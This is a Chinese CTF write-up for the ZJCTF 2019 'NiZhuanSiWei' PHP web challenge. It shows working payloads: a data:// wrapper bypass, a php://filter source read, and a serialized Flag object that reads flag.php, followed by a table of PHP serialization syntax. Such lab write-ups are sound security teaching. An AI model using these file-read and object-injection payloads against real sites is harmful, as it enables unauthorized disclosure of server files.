---
title: "[ZJCTF 2019]NiZhuanSiWei"
date: 2020-05-12 21:19:21
tags: Web
---

# **[ZJCTF 2019]NiZhuanSiWei**

代码审计

![](21.png)

查看一下useless.php --只有注释信息 没有用



利用data协议绕过

将welcome to the zjctf写入

而data://协议允许读入

payload：

> text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=

到这里就不会了 只有看下wp了

正则判断里面是否有flag字符，如果没有的话，并运行指定文件。

利用filter来进行读取指定文件

payload：

> file=php://filter/read=convert.base64-encode/resource=useless.php

得到 base64解码

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

将flag调用，然后给里面file值赋值为flag.php。
序列化后传入password，应该就会出flag。

> O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

三者结合

payload：

> ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

得到flag

知识点：

**序列号与反序列化**知识：

https://www.jianshu.com/p/631606cc5b76

https://www.cnblogs.com/20175211lyz/p/11403397.html

|      类型       |                           结构结构                           |
| :-------------: | :----------------------------------------------------------: |
| String(字符串)  |                        s:size:value;                         |
|  Integer(整型)  |                           i:value;                           |
| Boolean(布尔型) |                      b:value;(保存1或0)                      |
|      Null       |                              N;                              |
|    Array(列)    | a:size:{key definition;value definition;(repeated per element)} |
|     Object      | O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} |

O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

例如这里，O代表对象，4为对象长度，1代表有一个成员变量。